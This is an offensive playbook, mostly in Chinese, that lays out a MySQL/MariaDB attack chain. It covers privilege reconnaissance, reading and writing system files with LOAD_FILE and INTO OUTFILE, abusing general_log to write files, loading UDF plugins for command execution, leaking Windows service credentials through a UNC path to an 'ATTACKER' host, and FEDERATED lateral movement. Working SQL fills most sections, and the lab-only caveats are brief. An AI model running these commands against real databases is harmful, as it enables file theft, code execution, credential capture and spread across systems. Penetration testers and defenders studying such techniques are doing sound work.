# MySQL / MariaDB Direct-Service Attack Chain

---

## 1. Gate

```sql
SELECT VERSION(), USER(), CURRENT_USER(), @@hostname, @@version_compile_os;
SHOW GRANTS;
SELECT @@secure_file_priv, @@plugin_dir, @@global.general_log, @@global.general_log_file;
SHOW ENGINES;
```

关键权限：

```text
FILE
SYSTEM_VARIABLES_ADMIN（旧版可能SUPER）
CREATE SERVER
CREATE FUNCTION / plugin loading relevant privileges
OS filesystem permissions of mysqld account
```

---

## 2. File Read / OUTFILE

`LOAD_FILE()` / `INTO OUTFILE` 首先检查 `FILE` 和 `secure_file_priv`：

```sql
SELECT LOAD_FILE('/etc/hostname');
```

只有已知目标路径和写权限成立时才做 marker：

```sql
SELECT 'service-attack-marker' INTO OUTFILE '/allowed/path/marker.txt';
```

Cleanup：删除 marker 需要 OS 或其他可用文件 primitive；无法可靠清理时不要写生产路径。

---

## 3. general_log File Write

Black-cat 的方向值得保留，但条件必须修正：`general_log_file`/`general_log` 是动态全局变量，现代 MySQL 通常需要 `SYSTEM_VARIABLES_ADMIN`（旧版 SUPER）；最终是否能写任意路径取决于 mysqld OS 权限。`secure_file_priv` 不是 general_log 的核心门控。

记录原值：

```sql
SELECT @@global.log_output,@@global.general_log,@@global.general_log_file;
```

经批准后设置临时 marker 路径：

```sql
SET GLOBAL log_output='FILE';
SET GLOBAL general_log_file='/tmp/mysql-general-marker.log';
SET GLOBAL general_log=ON;
SELECT 'service-attack-marker';
SET GLOBAL general_log=OFF;
```

Cleanup：恢复三个原值并删除临时文件（若有 OS 文件删除 primitive）。

---

## 4. UDF / Plugin

先判断：

```sql
SELECT @@plugin_dir;
SHOW GRANTS;
```

UDF 不是“有 FILE 就一定 RCE”。需要能够把兼容共享库放进可加载目录、创建函数、架构/OS匹配，并且数据库进程具备文件权限。

授权靶场才加载测试 UDF；优先 marker `id` / `whoami`，不要直接长期 shell。

---

## 5. Windows UNC Authentication

Windows MySQL 的文件读取 primitive 可测试 UNC：

```sql
SELECT LOAD_FILE('\\\\ATTACKER\\share\\marker');
```

成功判断：服务身份向受控 SMB listener 发起认证。记录账户类型和 source，不自动推断域权限。

---

## 6. FEDERATED Lateral

```sql
SHOW ENGINES;
```

如果 `FEDERATED` 支持且当前身份有创建 server/table 能力，可在靶场验证到另一 MySQL 的连接关系。先使用只读远端表证明，避免修改远端数据。

链可连续 A→B，但每一跳都重新记录身份/权限。
